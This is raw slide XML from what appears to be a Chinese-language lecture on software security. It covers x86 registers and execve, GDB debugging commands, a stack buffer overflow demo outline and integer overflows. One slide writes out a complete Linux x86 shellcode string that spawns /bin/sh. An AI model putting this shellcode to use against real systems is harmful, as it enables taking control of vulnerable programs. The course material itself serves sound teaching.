              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>envp</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>esi</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>edi</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="组 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4956410" y="5484121"/>
            <a:ext cx="1069613" cy="369332"/>
            <a:chOff x="3672903" y="4927420"/>
            <a:chExt cx="1069613" cy="369332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="文本框 8"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3672903" y="4927420"/>
              <a:ext cx="792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rgbClr val="000000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>%</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>esp</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="22" name="直线箭头连接符 21"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4304632" y="5152190"/>
              <a:ext cx="43788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4956410" y="3226092"/>
            <a:ext cx="1433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"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/bin//</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"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75779" y="4441317"/>
            <a:ext cx="2543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000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CLTD converts signed long word EAX to double word EDX:EAX</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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61636" y="1394583"/>
            <a:ext cx="728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000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>int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</a:rPr>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill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</a:rPr>
              <a:t>const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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>char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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>filename</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>char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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>const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</a:rPr>
              <a:t>argv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[],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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>char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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>const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</a:rPr>
              <a:t>envp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[])</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;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01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Shellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>setuid</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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rcRect l="-6618" r="-6618"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="187787" y="1417638"/>
            <a:ext cx="8806790" cy="4843395"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="242320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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>hellcode</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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rcRect l="-1901" r="-1901"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="494553" y="1550716"/>
            <a:ext cx="8229600" cy="4525963"/>
          </a:xfr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51961"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="613126" y="1152280"/>
            <a:ext cx="2253703" cy="4361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94553" y="6076679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000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHELLCODE = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x6e      					\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>xcd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x80</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0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31263" y="2410046"/>
            <a:ext cx="7812974" cy="3077535"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575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8972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GDB</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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Starting GDB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Menlo Regular"/>
                <a:cs typeface="Menlo Regular"/>
              </a:rPr>
              <a:t>gdb</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Lucida Console"/>
                <a:cs typeface="Lucida Console"/>
              </a:rPr>
              <a:t>program</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> + run [</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>arglist</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>gdb</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> program [</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>arglist</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>] + run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>attach </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>pid</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Stopping GDB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>quit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Ctrl-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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289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GDB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Breakpoints and </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>Watchpoints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break function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>break *</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>addr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info break</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>clear function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>delete/enable/disable [n]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>watch </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>expr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info watch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229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GDB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Execution Control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>continue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>step</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>stepi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next</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>nexti</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean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233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GDB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 smtClean="0"/>
              <a:t>Display</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>print [/f] </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>expr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x	hex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>d	signed decimal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>u	unsigned decimal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>o	octal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>t	binary</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>a	address</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>c	character</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>f	floating point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>info </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>reg</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> [</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>rn</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>]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400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GDB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 smtClean="0"/>
              <a:t>Display</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>x [/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>Nuf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>] </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>expr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N	count of units to display</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>u	unit size</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>bytes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>h	</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>halfwords</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> (two bytes)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>w	words (four bytes)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>g	giant words (eight bytes)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>f	printing format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>s	null-terminated string</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> machine instructions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>disassem</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> [</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>]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881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GDB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demo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>调试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查看</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>main</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>函数的参数</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>查看栈结构</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>插入断点与控制执行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漏洞利用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寻找</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>shellcode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覆盖到返回地址的偏移</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>shellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>地址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6113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整数溢出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整数溢</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>出</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>算术运算结果超出表示范围</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings"/>
              </a:rPr>
              <a:t>检查不完整、数组越界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欧洲太空局</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Cluster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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>计划四颗卫星发射时爆炸，火箭飞行程序（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>1996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整数溢出攻击</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>文章</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Basic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>integer overflows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>M. Dowd </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2002</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0"/>
              <a:t>IO2BO</a:t>
            </a:r>
